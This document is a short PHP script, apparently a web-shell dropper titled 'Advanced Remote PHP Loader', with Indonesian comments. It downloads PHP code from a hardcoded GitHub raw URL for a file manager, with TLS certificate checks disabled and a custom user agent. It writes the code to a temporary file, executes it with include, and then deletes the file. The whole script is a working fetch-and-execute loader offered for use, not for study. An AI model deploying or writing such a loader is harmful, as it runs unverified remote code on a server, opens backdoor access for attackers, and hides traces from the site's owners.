<?php
/**
 * Advanced Remote PHP Loader
 * by Sw4CyEx - Simplified & Optimized Version
 */

declare(strict_types=1);

// Debug mode (aktifkan saat pengujian)
ini_set('display_errors', '1');
error_reporting(E_ALL);

/**
 * Fetch URL content dengan prioritas curl > file_get_contents > stream.
 */
function fetch_url(string $url, int $timeout = 10): ?string
{
    // Prefer CURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SwacyFetcher/2.0)',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        $data = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($data === false) {
            trigger_error("CURL error: $error", E_USER_WARNING);
            return null;
        }
        return $data;
    }

    // Fallback: file_get_contents
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => [
                'timeout' => $timeout,
                'user_agent' => 'SwacyFetcher/2.0'
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);
        $data = @file_get_contents($url, false, $context);
        return $data ?: null;
    }

    // Fallback terakhir
    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, 'r');
        if (!$handle) return null;
        $data = stream_get_contents($handle);
        fclose($handle);
        return $data ?: null;
    }

    return null;
}

/**
 * Jalankan kode PHP dari URL secara aman melalui file temporer.
 */
function run_remote_php(string $url): void
{
    $content = fetch_url($url);
    if (!$content) {
        exit("⚠️ Gagal mengambil konten dari: $url\n");
    }

    $tempFile = tempnam(sys_get_temp_dir(), 'swacy_');
    file_put_contents($tempFile, $content);

    try {
        include $tempFile;
    } catch (Throwable $e) {
        echo "❌ Error saat eksekusi: " . $e->getMessage();
    } finally {
        // Opsional: hapus file temporer setelah dijalankan
        @unlink($tempFile);
    }
}

// ====================
// Eksekusi utama
// ====================
run_remote_php('https://raw.githubusercontent.com/Sw4CyEx/AyanaFileManager/refs/heads/main/AyanaFileManager02.php');
